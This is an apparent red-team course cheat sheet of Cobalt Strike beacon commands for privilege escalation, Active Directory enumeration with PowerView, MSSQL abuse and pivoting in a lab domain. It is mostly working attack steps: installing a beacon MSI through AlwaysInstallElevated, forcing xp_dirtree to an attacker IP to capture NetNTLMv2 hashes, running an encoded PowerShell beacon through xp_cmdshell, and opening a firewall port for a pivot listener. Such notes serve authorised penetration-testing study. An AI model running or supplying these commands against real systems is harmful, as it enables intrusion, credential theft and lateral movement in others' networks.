# RTO CheatSheet

## Persistence

### COM Hijacking

<TODO>
  
## PrivEsc
  
### Seatbelt
  
https://github.com/GhostPack/Seatbelt
  
Sample usage:
  
> beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
  
### SharpUp

https://github.com/GhostPack/SharpUp

Sample usage:
  
> beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
> 
> === Modifiable Services ===
> 
>  Name             : Vuln-Service-2
>
>  DisplayName      : Vuln-Service-2
>
>  Description      : 
>
>  State            : Running
>
>  StartMode        : Auto
>
>  PathName         : "C:\Program Files\Vuln Services\Service 2.exe"

Detects:
  - Modifiable Service
  - AlwaysInstallElevated flags in Registry
  
#### Weaponized

##### AlwaysInstallElevated - Install msi package file

> beacon> run msiexec /i BeaconInstaller.msi /q /n
  
## Domain Enumeration
  
### PowerView
  
#### Setup

> beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
  
#### Usages
  
Retrieve Domain information, parameter is optional:
  
> beacon> powershell Get-Domain -Domain <Domain>

Retrieve Domain Controllers and further Domain information:

> beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl
  
Retrieve Forest information, parameter is optional:
  
> beacon> powershell Get-ForestDomain -Forest [Forest]
  
Get useful information about domain policies like password policies e.g
  
> beacon> powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess
  
Get User information:
  
> beacon> powershell Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | fl
  
Get Available Shares (important for lateral movement and GPO Abuses):
  
> beacon> powershell Find-DomainShare -CheckShareAccess
  
## MSSQL
  
### Enum

Import PowerUpSQL

Execute following statements from Domain-User context (AD Authentication on MSSQL hosts):

Enum SQL Instance:

> beacon> powershell Get-SQLInstanceDomain
  
Test connection:

> beacon> powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl

Retrieve additional Instance Information:
 
> beacon> powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
  
Test execution:

> beacon> powershell Get-SQLQuery -Instance "INSTANCE,1433" -Query "select @@servername"
  
Proxychains for direct connection:
  
> root@kali:~# proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DOMAIN/USER@TARGET
  
NetNTLMv2 via xp_dirtree (Inveigh on Host in target network, or smbserver on Kali with WinDivert + rportfwd):
  
> beacon> powershell Get-SQLQuery -Instance "INSTANCE,1433" -Query "EXEC xp_dirtree '\\IP\pwn', 1, 1"

Query to execute beacon on the instance directly:

> SELECT * FROM OPENQUERY("[targetserver]", 'select @@servername; exec xp_cmdshell ''powershell -enc [EncodedString]''');

## Pivoting

- Right click on running beacon -> pivoting
- Create pivoting listener (example, port 4444)

add firewall rule:
  
> beacon> run netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
